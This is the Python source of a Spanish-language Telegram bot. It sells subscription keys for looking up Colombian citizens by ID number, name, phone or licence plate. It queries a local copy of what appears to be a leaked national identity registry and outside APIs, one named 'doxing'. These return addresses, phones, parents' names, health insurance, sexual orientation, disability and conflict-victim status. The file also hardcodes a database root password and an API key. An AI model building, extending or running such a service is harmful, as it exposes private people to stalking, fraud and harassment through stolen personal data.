import mysql.connector
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes,MessageHandler, filters
from mysql.connector import pooling
import logging
import random
import string
from datetime import datetime, timedelta
import os
import subprocess
import tempfile
import requests
import json

# Configuración del logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)
httpx_logger = logging.getLogger("httpx")
httpx_logger.setLevel(logging.WARNING)

# Configuración de la conexión a la base de datos
pool = mysql.connector.pooling.MySQLConnectionPool(
    pool_name="pool_db",
    pool_size=10,
    host="localhost",
    user="root",
    password="nabo94nabo94",
    database="ani",
    charset="utf8"
)

# ======== CONFIG APIs ========
API_URL_C2 = "https://extract.nequialpha.com/doxing"
PLACA_API_URL = "https://alex-bookmark-univ-survival.trycloudflare.com/index.php"
START_IMAGE_URL = "https://i.postimg.cc/xTbPbYFN/photo-2026-01-29-18-20-26.jpg"
LLAVE_API_BASE = "https://believes-criterion-tricks-notifications.trycloudflare.com/"
TIMEOUT = 120
# ===============================

def clean(value):
    if value is None or value == "" or value == "null":
        return "No registra"
    if isinstance(value, bool):
        return "Sí" if value else "No"
    return str(value)

def consultar_cedula_c2(cedula):
    try:
        r = requests.post(
            API_URL_C2,
            json={"cedula": str(cedula)},
            headers={"Content-Type": "application/json"},
            timeout=TIMEOUT
        )
        r.raise_for_status()
        return r.json()
    except Exception as e:
        logger.error(f"Error al consultar C2: {e}")
        return None

def consultar_placa(placa):
    try:
        r = requests.get(
            PLACA_API_URL,
            params={"placa": placa},
            timeout=TIMEOUT
        )
        r.raise_for_status()
        return r.json()
    except Exception as e:
        logger.error(f"Error al consultar placa: {e}")
        return None

def consultar_llave(alias):
    try:
        r = requests.get(
            LLAVE_API_BASE,
            params={"hexn": alias},
            timeout=TIMEOUT
        )
        r.raise_for_status()
        return r.json()
    except Exception as e:
        logger.error(f"Error al consultar llave: {e}")
        return None


def consultar_nequi(telefono):
    """Consulta la API /consultar de nequialpha con el teléfono proporcionado."""
    try:
        url = "https://extract.nequialpha.com/consultar"
        headers = {
            "X-Api-Key": "M43289032FH23B",
            "Content-Type": "application/json"
        }
        payload = {"telefono": str(telefono)}
        r = requests.post(url, json=payload, headers=headers, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except Exception as e:
        logger.error(f"Error al consultar Nequi: {e}")
        return None


# ======== Comando /start ========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    texto = (
        "乄 𝐏𝐀𝐁𝐋𝐎 𝗠𝗘𝗡𝗨 ⚔️\n"
        "═════════════════════════\n"
        "𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐢𝐝𝐨 𝐚𝐥 𝐢𝐧𝐟𝐢𝐞𝐫𝐧𝐨 𝐝𝐢𝐠𝐢𝐭𝐚𝐥... 𝐚𝐜𝐚 𝐧𝐨 𝐡𝐚𝐲 𝐫𝐞𝐠𝐥𝐚𝐬, 𝐬𝐨𝐥𝐨 𝐜𝐨𝐦𝐚𝐧𝐝𝐨𝐬 ⚔️\n"
        "═════════════════════════\n"
        "┏━━━━━━━━━━━━━━━━━━━━━━━⩺\n"
        "┃ ⚙️ 𝐂𝐎𝐌𝐀𝐍𝐃𝐎𝐒 𝐃𝐈𝐒𝐏𝐎𝐍𝐈𝐁𝐋𝐄𝐒\n"
        "┃ ⚙️ 𝗕𝗼𝘁:@PabloadmincoBot \n"
        "┃ ⚔️ /start ➛ 𝐃𝐄𝐒𝐏𝐈𝐄𝐑𝐓𝐀 𝐋𝐀 𝐁𝐄𝐒𝐓𝐈𝐀 \n"
        "┃ ⚔️ /cc ➛ 𝐈𝐍𝐕𝐄𝐒𝐓𝐈𝐆𝐀 𝐋𝐎 𝐎𝐂𝐔𝐋𝐓𝐎 𝐯1\n"
        "┃ ⚔️ /c2 ➛ 𝐈𝐍𝐕𝐄𝐒𝐓𝐈𝐆𝐀 𝐋𝐎 𝐎𝐂𝐔𝐋𝐓𝐎 𝐯2\n"
        "┃ ⚔️ /nequi ➛ 𝐈𝐍𝐕𝐄𝐒𝐓𝐈𝐆𝐀 𝐋𝐎 𝐎𝐂𝐔𝐋𝐓𝐎 𝐯3\n"
        "┃ ⚔️ /llave ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐀𝐋𝐈𝐀𝐒\n"
        "┃ ⚔️ /placa ➛ 𝐂𝐎𝐍𝐒𝐔𝐋𝐓𝐀 𝐏𝐋𝐀𝐂𝐀\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━━⩺\n"
        "⚠️ 𝐂𝐚𝐝𝐚 𝐎𝐫𝐝𝐞𝐧 𝐄𝐣𝐞𝐜𝐮𝐭𝐚𝐝𝐚 𝐝𝐞𝐣𝐚 𝐜𝐢𝐜𝐚𝐭𝐫𝐢𝐜𝐞𝐬...𝐔𝐬𝐚𝐥𝐨 𝐜𝐨𝐧 𝐫𝐞𝐬𝐩𝐨𝐧𝐬𝐚𝐛𝐢𝐥𝐢𝐝𝐚𝐝 𝐨 𝐬𝐞𝐫𝐚𝐬 𝐝𝐞𝐛𝐨𝐫𝐚𝐝𝐨.\n"
        "═════════════════════════\n"
        "👑 𝙤𝙬𝙣𝙚𝙧: @Broquicalifoxx
    )

    try:
        await update.message.reply_photo(photo=START_IMAGE_URL, caption=texto)
    except Exception:
        logging.exception("Error enviando /start")
        await update.message.reply_text("⚠️ No se pudo enviar la imagen.")

# Comando /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "<b>📚 𝑪𝒐𝒎𝒂𝒏𝒅𝒐𝒔 𝒅𝒊𝒔𝒑𝒐𝒏𝒊𝒃𝒍𝒆𝒔 📚</b>\n\n"
        "<b>🚀 /start</b> - 𝑴𝒆𝒏𝒔𝒂𝒋𝒆 𝒅𝒆 𝒃𝒊𝒆𝒏𝒗𝒆𝒏𝒊𝒅𝒂 🚀\n\n"
        "<b>👤 /nombres </b> - [𝒏𝒐𝒎𝒃𝒓𝒆 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒐] 👤\n\n"
        "<b>🎫 /cc </b> - 𝑩𝒖𝒔𝒄𝒂 𝒊𝒏𝒇𝒐𝒓𝒎𝒂𝒄𝒊ó𝒏  𝒑𝒐𝒓 𝒄é𝒅𝒖𝒍𝒂 🎫\n\n"
        "<b>🚗 /c2 </b> - 𝑪𝒐𝒏𝒔𝒖𝒍𝒕𝒂 𝒅𝒆 𝒅𝒐𝒄𝒖𝒎𝒆𝒏𝒕𝒐𝒔 🚗\n\n"
        "<b>🔑 /llave </b> - 𝑪𝒐𝒏𝒔𝒖𝒍𝒕𝒂 𝒅𝒆 𝒍𝒍𝒂𝒗𝒆𝒔 🔑\n\n"
        "<b>🚔 /placa </b> - 𝑪𝒐𝒏𝒔𝒖𝒍𝒕𝒂 𝒅𝒆 𝒑𝒍𝒂𝒄𝒂𝒔 🚔\n\n"
        "<b>🔒 /info</b> - 𝑰𝒏𝒇𝒐𝒓𝒎𝒂𝒄𝒊ó𝒏 𝒅𝒆 𝒕𝒖 𝒔𝒖𝒔𝒄𝒓𝒊𝒑𝒄𝒊ó𝒏 🔒\n\n"
        "<b>🔧 /redeem [key]</b> - 𝑹𝒆𝒅𝒊𝒎𝒊𝒓 𝒕𝒖 𝒍𝒍𝒂𝒗𝒆 𝒎𝒂𝒆𝒔𝒕𝒓𝒂 🔧\n\n",
        parse_mode="HTML"
    )

async def registrar_usuario(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    telegram_username = update.message.from_user.username
    date_registered = datetime.now()

    connection = None
    cursor = None

    try:
        connection = pool.get_connection()
        cursor = connection.cursor()

        cursor.execute("SELECT user_id FROM users WHERE user_id = %s", (user_id,))
        existing_user = cursor.fetchone()

        if existing_user is None:
            cursor.execute("""
                INSERT INTO users (user_id, telegram_username, date_registered)
                VALUES (%s, %s, %s)
            """, (user_id, telegram_username, date_registered))
            connection.commit()

            logger.info(f"Usuario @{telegram_username} registrado correctamente.")
        else:
            logger.info(f"El usuario @{telegram_username} ya está registrado.")

    except mysql.connector.Error as e:
        logger.error(f"Error al registrar usuario: {e}")

    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()


async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if not es_admin(user_id):
        await update.message.reply_text("No tienes permisos para agregar administradores.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Por favor, proporciona el ID del usuario que deseas agregar como administrador. Ejemplo: /addadmin 123456789")
        return

    try:
        nuevo_admin_id = int(context.args[0])

        connection = pool.get_connection()
        cursor = connection.cursor()

        cursor.execute("SELECT user_id FROM admins WHERE user_id = %s", (nuevo_admin_id,))
        existing_admin = cursor.fetchone()

        if existing_admin:
            await update.message.reply_text(f"El usuario {nuevo_admin_id} ya es administrador.")
        else:
            cursor.execute("INSERT INTO admins (user_id) VALUES (%s)", (nuevo_admin_id,))
            connection.commit()
            await update.message.reply_text(f"El usuario {nuevo_admin_id} ha sido agregado como administrador.")

    except mysql.connector.Error as e:
        logger.error(f"Error al agregar administrador: {e}")
        await update.message.reply_text("Hubo un error al agregar el administrador.")
    except ValueError:
        await update.message.reply_text("Por favor, proporciona un ID de usuario válido.")
    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()


def es_admin(user_id):
    cursor = None
    connection = None

    try:
        logger.info(f"Verificando si el usuario {user_id} es admin.")
        connection = pool.get_connection()
        cursor = connection.cursor()

        query = "SELECT 1 FROM admins WHERE user_id = %s"
        cursor.execute(query, (user_id,))
        admin = cursor.fetchone()

        return admin is not None
    
    except mysql.connector.Error as e:
        logger.error(f"Error al verificar administrador para el usuario {user_id}: {e}")
        return False
    
    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()

    
def tiene_key_valida(user_id):

    connection = None
    cursor = None
    try:
        connection = pool.get_connection()
        cursor = connection.cursor(dictionary=True)

        query = """
            SELECT 1
            FROM user_keys
            WHERE user_id = %s AND redeemed = TRUE AND expiration_date > NOW()
        """
        cursor.execute(query, (user_id,))
        result = cursor.fetchone()

        return result is not None
    except mysql.connector.Error as e:
        logger.error(f"Error al verificar clave activa del usuario: {e}")
        return False
    
    finally:
        if cursor:
            cursor.close()

        if connection and connection.is_connected():
            connection.close()
    
async def generar_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    if not es_admin(user_id):
        await update.message.reply_text("No tienes permisos para generar claves.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Por favor, proporciona el ID de usuario y los días de expiración.")
        return

    try:
        id_usuario = int(context.args[0])
        dias_expiracion = int(context.args[1])

        prefijo = "KEY-"

        key = prefijo + ''.join(random.choices(string.ascii_letters + string.digits, k=15))
        key_formateada = f"`{key}`"

        expiration_date = datetime.now() + timedelta(days=dias_expiracion)

        connection = pool.get_connection()
        cursor = connection.cursor()

        cursor.execute("INSERT INTO `user_keys` (key_value, user_id, expiration_date) VALUES (%s, %s, %s)",
                       (key, id_usuario, expiration_date))
        connection.commit()

        await update.message.reply_text(f"Clave generada: {key_formateada}\nExpira en: {expiration_date}", parse_mode="Markdown")
    
    except mysql.connector.Error as e:
        logger.error(f"Error de MySQL al generar la clave: {e}")
        await update.message.reply_text("Hubo un error al generar la clave. Intenta nuevamente.")
    
    except ValueError:
        await update.message.reply_text("Por favor, proporciona valores válidos para el ID de usuario y los días de expiración.")
    
    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        await update.message.reply_text(f"Error inesperado: {e}")

    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id

    if not context.args:
        await update.message.reply_text(
            "⚠️ Indica la clave: `/redeem KEY-123`",
            parse_mode="Markdown"
        )
        return

    key = context.args[0]

    connection = None
    cursor = None

    try:
        connection = pool.get_connection()
        cursor = connection.cursor(dictionary=True)

        cursor.execute(
            """
            SELECT key_id, expiration_date
            FROM user_keys
            WHERE key_value = %s
              AND redeemed = FALSE
              AND expiration_date > NOW()
            """,
            (key,)
        )
        result = cursor.fetchone()

        if not result:
            await update.message.reply_text("❌ Clave no válida, ya redimida o expirada.")
            return

        cursor.execute(
            """
            UPDATE user_keys
            SET redeemed = TRUE,
                user_id = %s
            WHERE key_id = %s
            """,
            (user_id, result["key_id"])
        )
        connection.commit()

        await update.message.reply_text("✅ Clave redimida con éxito.")

    except mysql.connector.Error as e:
        logger.error(f"Error MySQL al redimir la clave: {e}")
        await update.message.reply_text(
            "❌ Error al redimir la clave. Inténtalo nuevamente."
        )

    except Exception as e:
        logger.error(f"Error inesperado al redimir la clave: {e}")
        await update.message.reply_text(
            "❌ Error inesperado al procesar la clave."
        )

    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()


async def eliminar_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    if not es_admin(user_id):
        await update.message.reply_text("No tienes permisos para eliminar claves.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Por favor, proporciona el ID de la clave que deseas eliminar.")
        return

    try:
        key_id = context.args[0]

        connection = pool.get_connection()
        cursor = connection.cursor()

        cursor.execute("DELETE FROM `user_keys` WHERE `key_value` = %s", (key_id,))
        connection.commit()

        if cursor.rowcount > 0:
            await update.message.reply_text(f"La clave con ID {key_id} ha sido eliminada exitosamente.")
        else:
            await update.message.reply_text(f"No se encontró la clave con ID {key_id}.")

        await ver_claves_admin(update, context)

    except mysql.connector.Error as e:
        logger.error(f"Error al eliminar clave: {e}")
        await update.message.reply_text(f"Hubo un error al eliminar la clave: {e}")
    except Exception as e:
        logger.error(f"Error inesperado al eliminar clave: {e}")
        await update.message.reply_text(f"Hubo un error inesperado: {e}")
    
    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()


async def ver_claves_admin(update: Update, context: ContextTypes.DEFAULT_TYPE): 
    user_id = update.message.from_user.id
    
    if not es_admin(user_id):
        await update.message.reply_text("No tienes permisos para ver las claves.")
        return

    connection = None
    cursor = None
    try:
        connection = pool.get_connection()
        cursor = connection.cursor(dictionary=True)

        cursor.execute("""
            SELECT uk.key_value, uk.expiration_date, u.telegram_username, uk.redeemed, uk.created_at
            FROM `user_keys` uk
            LEFT JOIN `users` u ON uk.user_id = u.user_id
            WHERE uk.key_value IS NOT NULL  
        """)
        claves = cursor.fetchall()

        if claves:
            mensaje = "*Listado de claves generadas:*\n\n"
            
            for clave in claves:
                if clave['expiration_date']:
                    dias_restantes = (clave['expiration_date'] - datetime.now()).days
                else:
                    dias_restantes = "Desconocido"

                estado_redimida = 'Sí' if clave['redeemed'] else 'No'
                
                mensaje += f"🔑 *ID:* {clave['key_value']}\n"
                
                if clave['telegram_username']:
                    mensaje += f"👤 *Usuario:* @{clave['telegram_username']}\n"
                else:
                    mensaje += f"👤 *Usuario:* *Sin usuario asignado*\n"
                
                mensaje += f"📅 *Fecha de Creación:* {clave['created_at']}\n"
                mensaje += f"⏳ *Expira en:* {dias_restantes} días\n"
                mensaje += f"✅ *Redimida:* {estado_redimida}\n\n"
                mensaje += f"✅ *Creado por @HEXXN_x:*\n\n"
            
            await update.message.reply_text(mensaje, parse_mode='Markdown')
        else:
            await update.message.reply_text("No hay claves disponibles.")

    except mysql.connector.Error as e:
        logger.error(f"Error al obtener claves: {e}")
        await update.message.reply_text(f"Hubo un error al obtener las claves: {e}")
    except Exception as e:
        logger.error(f"Error inesperado al obtener claves: {e}")
        await update.message.reply_text(f"Hubo un error inesperado: {e}")
    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()


async def ver_info_usuario(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    logger.info(f"Usuario {user_id} ejecutó el comando para ver información de su usuario.")

    connection = None
    cursor = None

    try:
        connection = pool.get_connection()
        logger.info("Conexión a la base de datos establecida.")

        cursor = connection.cursor(dictionary=True)
        logger.info("Cursor creado exitosamente.")

        query = """
            SELECT uk.key_value, u.telegram_username, uk.created_at,
                   DATEDIFF(uk.expiration_date, NOW()) AS dias_restantes,
                   u.date_registered
            FROM user_keys uk
            LEFT JOIN users u ON uk.user_id = u.user_id
            WHERE uk.user_id = %s
            ORDER BY uk.created_at DESC LIMIT 1
        """
        logger.debug(f"Consulta SQL: {query} con ID: {user_id}")
        cursor.execute(query, (user_id,))
        logger.info("Consulta ejecutada correctamente.")

        result = cursor.fetchone()
        logger.debug(f"Resultado de la consulta: {result}")

        if result:
            if result['key_value']:
                mensaje = (
                    f"🔑 **KEY:** `{result['key_value']}`\n"
                    f"👤 **Usuario:** @{result['telegram_username'] or 'Sin usuario asociado'}\n"
                    f"📅 **Fecha de Creación:** {result['created_at']}\n"
                    f"⏳ **Expira en:** {result['dias_restantes']} días\n"
                    f"⏳ **Creado por @HEXXN_x**"
                    
                )
                logger.info(f"Información obtenida para el usuario {user_id}: {mensaje}")
            else:
                mensaje = (
                    f"🔑 **KEY:** No tienes clave activa o redimida.\n"
                    f"👤 **Usuario:** @{result['telegram_username'] or 'Sin usuario asociado'}\n"
                    f"📅 **Fecha de Registro:** {result['date_registered']}\n"
                )
                logger.info(f"No clave activa para el usuario {user_id}. Mostrando solo la información del usuario.")
            
            await update.message.reply_text(mensaje, parse_mode='Markdown')
        else:
            logger.warning(f"No se encontró información para el usuario ID: {user_id}")
            await update.message.reply_text("No se encontró información del usuario.")
                
    except mysql.connector.Error as e:
        logger.error(f"Error al conectar o consultar la base de datos: {e}")
        await update.message.reply_text("Hubo un error al obtener la información del usuario.")
    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        await update.message.reply_text("Hubo un error inesperado al procesar la solicitud.")
    finally:
        if cursor:
            cursor.close()
            logger.info("Cursor cerrado.")
        if connection:
            connection.close()
            logger.info("Conexión a la base de datos cerrada.")


def buscar_cedula(cedula, user_id=None, telegram_username=None):
    connection = None
    cursor = None
    try:
        connection = pool.get_connection()
        cursor = connection.cursor(dictionary=True)

        if telegram_username:
            logger.info(f"Usuario @{telegram_username} (ID: {user_id}) solicitó información para la cédula: {cedula}")
        else:
            logger.info(f"Usuario con ID: {user_id} solicitó información para la cédula: {cedula}")

        query = """
            SELECT
                ANINuip,
                ANIApellido1, ANIApellido2,
                ANINombre1, ANINombre2,
                ANINombresPadre,
                ANINombresMadre,
                ANIFchNacimiento, ANIFchExpedicion,
                ANISexo, ANIEstatura,
                ANIDireccion, ANITelefono,
                LUGIdNacimiento, LUGIdExpedicion, LUGIdResidencia, 
                LUGIdUbicacionElectoral, LUGIdPreparacion,
                ANIFchActualizacion, GRSId
            FROM ani WHERE ANINuip = %s
        """
        logger.info(f"Ejecutando consulta SQL para cédula: {cedula}")
        cursor.execute(query, (cedula,))
        datos = cursor.fetchone()

        if datos:
            logger.info(f"Usuario @{telegram_username} (ID: {user_id}) - Datos encontrados para la cédula: {cedula}")
            return datos
        else:
            logger.warning(f"Usuario @{telegram_username} (ID: {user_id}) - No se encontró información para la cédula: {cedula}")
            return None

    except mysql.connector.Error as e:
        logger.error(f"Usuario @{telegram_username} (ID: {user_id}) - Error de MySQL al buscar cédula {cedula}: {e}")
        return None

    except Exception as e:
        logger.error(f"Usuario @{telegram_username} (ID: {user_id}) - Error inesperado al buscar cédula {cedula}: {e}")
        return None

    finally:
        if cursor:
            cursor.close()
        if connection:
            connection.close()


def buscar_por_nombre_completo_o_nombre_y_apellidos(nombre_completo):
    connection = None
    cursor = None
    try:
        connection = pool.get_connection()
        cursor = connection.cursor(dictionary=True)

        partes_nombre = nombre_completo.split()

        if len(partes_nombre) < 3:
            logger.warning(f"Entrada no válida: el nombre debe incluir al menos un nombre y dos apellidos. Entrada: {nombre_completo}")
            return None

        nombre1 = partes_nombre[0]
        apellido1 = partes_nombre[1]
        apellido2 = partes_nombre[2]
        nombre2 = partes_nombre[3] if len(partes_nombre) > 3 else None

        query = """
            SELECT
                ANINuip,
                ANIApellido1, ANIApellido2,
                ANINombre1, ANINombre2,
                ANINombresPadre,
                ANINombresMadre,
                ANIFchNacimiento, ANIFchExpedicion,
                ANISexo, ANIEstatura,
                ANIDireccion, ANITelefono,
                LUGIdNacimiento, LUGIdExpedicion, LUGIdResidencia, 
                LUGIdUbicacionElectoral, LUGIdPreparacion,
                ANIFchActualizacion, GRSId
            FROM ani
            WHERE ANINombre1 = %s AND ANIApellido1 = %s AND ANIApellido2 = %s
        """
        params = [nombre1, apellido1, apellido2]

        if nombre2:
            query += " AND ANINombre2 = %s"
            params.append(nombre2)

        logger.info(f"Ejecutando consulta SQL para el nombre completo: {nombre_completo}")
        cursor.execute(query, tuple(params))
        datos = cursor.fetchall()

        if datos:
            return datos
        else:
            logger.warning(f"No se encontró información para el nombre completo: {nombre_completo}")
            return None

    except mysql.connector.Error as e:
        logger.error(f"Error de MySQL: {e}")
        return None

    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        return None

    finally:
        if cursor:
            cursor.close()
        if connection:
            connection.close()


def obtener_lugares(codigo):
    connection = None
    cursor = None
    try:
        codigo = str(codigo) if not isinstance(codigo, str) else codigo
        
        if len(codigo) >= 8:
            codigo_extraido = codigo[3:8]
            logger.info(f"Extrayendo código: {codigo_extraido} de {codigo}")

            connection = pool.get_connection()
            cursor = connection.cursor(dictionary=True)

            connection.database = 'ani'

            logger.info(f"Consultando lug_ori con el código extraído: {codigo_extraido}")

            query = "SELECT * FROM lug_ori WHERE cod_lug LIKE %s"
            cursor.execute(query, (f"%{codigo_extraido}%",))

            resultado = cursor.fetchall()

            if resultado:
                for row in resultado:
                    logger.info(f"Lugar encontrado: {row['lug']}")
                    return row['lug']
            else:
                logger.error(f"No se encontró lugar para el código: {codigo_extraido}")
                return None
        else:
            logger.error(f"El código no tiene el formato esperado. Código recibido: {codigo}")
            return None

    except mysql.connector.Error as e:
        logger.error(f"Error de MySQL al consultar lug_ori: {e}")
        return None
    except ValueError as e:
        logger.error(f"Error al procesar el código recibido: {e}")
        return None
    except Exception as e:
        logger.error(f"Error inesperado al obtener lugar desde lug_ori: {e}")
        return None
    finally:
        if cursor:
            cursor.close()
        if connection:
            connection.close()


async def mostrar_datos_cedula(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    telegram_username = update.message.from_user.username

    if not tiene_key_valida(user_id):
        await update.message.reply_text("❌ No tienes una clave activa para usar este comando.")
        logger.warning(f"Usuario @{telegram_username} ({user_id}) intentó usar /cc sin clave.")
        return

    if not context.args:
        await update.message.reply_text("⚠️ Por favor, proporciona una cédula.\nEjemplo: `/cc 12345678`", parse_mode="Markdown")
        return

    cedula = context.args[0]
    logger.info(f"Usuario @{telegram_username} ({user_id}) consultando CC: {cedula}")

    datos = buscar_cedula(cedula, user_id=user_id, telegram_username=telegram_username)

    if datos:
        lugar_nacimiento = obtener_lugares(datos['LUGIdNacimiento'])
        lugar_expedicion = obtener_lugares(datos['LUGIdExpedicion'])
        lugar_residencia = obtener_lugares(datos['LUGIdResidencia'])

        mensaje = f"🪪 CC: `{cedula}`\n\n"
        mensaje += f"👤 Nombres: `{datos['ANINombre1']}` `{datos['ANINombre2']}`\n"
        mensaje += f"👤 Apellidos: `{datos['ANIApellido1']}` `{datos['ANIApellido2']}`\n"
        mensaje += f"👨 Padre: `{datos['ANINombresPadre']}`\n"
        mensaje += f"👩‍🦱 Madre: `{datos['ANINombresMadre']}`\n"
        mensaje += f"📅 Fecha de Nacimiento: `{datos['ANIFchNacimiento']}`\n"
        mensaje += f"📅 Fecha de Exp. Cédula: `{datos['ANIFchExpedicion']}`\n"
        mensaje += f"🖇 Sexo: `{datos['ANISexo']}`\n"
        mensaje += f"🔆 Altura: `{datos['ANIEstatura']}` cm\n"
        mensaje += f"🏚 Dirección: `{datos['ANIDireccion']}`\n"
        mensaje += f"📱 Teléfono: `{datos['ANITelefono']}`\n"
        mensaje += f"💻 Lugar de Nacimiento: `{lugar_nacimiento if lugar_nacimiento else 'No encontrado'}`\n"
        mensaje += f"💻 Lugar de Exp.: `{lugar_expedicion if lugar_expedicion else 'No encontrado'}`\n"
        mensaje += f"💻 Lugar Residencia: `{lugar_residencia if lugar_residencia else 'No encontrado'}`\n\n"
        mensaje += f"🛡 Creditos para: `@HEXXN_x`\n\n" 

        await update.message.reply_text(mensaje, parse_mode="Markdown")
        logger.info(f"Usuario @{telegram_username} (ID: {user_id}) - Datos enviados para la cédula: {cedula}")
    else:
        await update.message.reply_text("No se encontraron datos para esa cédula.")
        logger.warning(f"Usuario @{telegram_username} (ID: {user_id}) - No se encontraron datos para la cédula: {cedula}")


async def mostrar_datos_nombres(update: Update, context: ContextTypes.DEFAULT_TYPE):

    user_id = update.message.from_user.id

    if not tiene_key_valida(user_id):
        await update.message.reply_text("No tienes una clave activa para usar este comando.")
        return

    if len(context.args) == 0:
        await update.message.reply_text("Por favor, proporciona un nombre completo. Ejemplo: /nombres Juan López Gómez")
        return

    nombre_completo = " ".join(context.args)
    logger.info(f"Comando /nombres recibido para: {nombre_completo}")

    partes_nombre = nombre_completo.split()
    if len(partes_nombre) < 3:
        await update.message.reply_text(
            "⚠️ Por favor, proporciona un nombre completo que incluya al menos un nombre y dos apellidos.\n"
            "Ejemplo: /nombres Juan López Gómez"
        )
        logger.warning(f"Entrada insuficiente: {nombre_completo}")
        return

    await update.message.reply_text("🔍 BUSCANDO EN LA BASE DE DATOS... POR FAVOR ESPERE.")

    datos = buscar_por_nombre_completo_o_nombre_y_apellidos(nombre_completo)

    if datos:
        for dato in datos:
            lugar_nacimiento = obtener_lugares(dato['LUGIdNacimiento'])
            lugar_expedicion = obtener_lugares(dato['LUGIdExpedicion'])
            lugar_preparacion = obtener_lugares(dato['LUGIdPreparacion'])

            mensaje = f"🪪 CC: `{dato['ANINuip']}`\n\n"
            mensaje += f"👤 Nombres: `{dato['ANINombre1']}` `{dato['ANINombre2'] if dato['ANINombre2'] else ''}`\n"
            mensaje += f"👤 Apellidos: `{dato['ANIApellido1']}` `{dato['ANIApellido2']}`\n"
            mensaje += f"👨 Padre: `{dato['ANINombresPadre']}`\n"
            mensaje += f"👩‍🦱 Madre: `{dato['ANINombresMadre']}`\n"
            mensaje += f"📅 Fecha de Nacimiento: `{dato['ANIFchNacimiento']}`\n"
            mensaje += f"📅 Fecha de Exp. Documento: `{dato['ANIFchExpedicion']}`\n"
            mensaje += f"🖇 Sexo: `{dato['ANISexo']}`\n"
            mensaje += f"🔆 Altura: `{dato['ANIEstatura']}` cm\n"
            mensaje += f"🏚 Dirección: `{dato['ANIDireccion']}`\n"
            mensaje += f"📱 Teléfono: `{dato['ANITelefono']}`\n"
            mensaje += f"💻 Lugar de Nacimiento: `{lugar_nacimiento if lugar_nacimiento else 'No encontrado'}`\n"
            mensaje += f"💻 Lugar de Expedición: `{lugar_expedicion if lugar_expedicion else 'No encontrado'}`\n"
            mensaje += f"💻 Lugar Residencia: `{lugar_preparacion if lugar_preparacion else 'No encontrado'}`\n\n"
            mensaje += f"🛡 Creditos para: `@HEXXN_x`\n\n" 

            await update.message.reply_text(mensaje, parse_mode="Markdown")
            logger.info(f"Datos enviados para el nombre completo: {nombre_completo}")
    else:
        await update.message.reply_text("No se encontraron datos para el nombre proporcionado.")
        logger.warning(f"No se encontraron datos para el nombre completo: {nombre_completo}")


# ======== COMANDOS C2, PLACA, LLAVE ========

async def comando_c2(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    telegram_username = update.message.from_user.username

    # Verificar clave válida
    if not tiene_key_valida(user_id):
        await update.message.reply_text("❌ No tienes una clave activa para usar este comando.")
        return

    if not context.args:
        await update.message.reply_text("📌 Uso:\n/c2 <documento>")
        return

    documento = context.args[0]

    try:
        res = consultar_cedula_c2(documento)

        if not res or not res.get("success"):
            await update.message.reply_text("❌ No se encontró información.")
            return

        d = res.get("data", {})

        mensaje = (
            "📄 RESULTADO BY HEXN  @HEXXN_x\n\n"
            f"🆔 Documento: {clean(d.get('cedula'))}\n"
            f"🪪 Tipo: {clean(d.get('tipo_documento'))}\n\n"
        )

        secciones = {
            "👤 IDENTIDAD": [
                "primer_nombre", "segundo_nombre",
                "primer_apellido", "segundo_apellido",
                "sexo", "genero", "orientacion_sexual",
                "fecha_nacimiento"
            ],
            "📍 UBICACIÓN": [
                "pais_nacimiento", "departamento_nacimiento", "municipio_nacimiento",
                "pais_residencia", "departamento_residencia", "municipio_residencia",
                "area_residencia", "direccion"
            ],
            "🏥 SALUD": [
                "regimen_afiliacion", "eps",
                "esquema_vacunacion_completo",
                "esquema_vacunacion_adecuado"
            ],
            "📋 ESTADO GENERAL": [
                "estudia_actualmente", "pertenencia_etnica",
                "desplazado", "discapacitado",
                "victima_conflicto_armado", "fallecido"
            ]
        }

        usados = set()

        for titulo, campos in secciones.items():
            bloque = []
            for campo in campos:
                if campo in d:
                    usados.add(campo)
                    bloque.append(f"• {campo.replace('_',' ').title()}: {clean(d.get(campo))}")
            if bloque:
                mensaje += f"{titulo}\n" + "\n".join(bloque) + "\n\n"

        extras = []
        for k, v in d.items():
            if k not in usados and k not in ["cedula", "tipo_documento"]:
                extras.append(f"• {k.replace('_',' ').title()}: {clean(v)}")

        if extras:
            mensaje += "🧩 OTROS DATOS\n" + "\n".join(extras) + "\n\n"

        mensaje += "🗄 DB: True\n✅ Estado: OK"

        await update.message.reply_text(mensaje)

    except Exception as e:
        logger.error(f"Error en /c2: {e}")
        await update.message.reply_text("❌ Error al procesar la solicitud. Inténtalo nuevamente más tarde.")


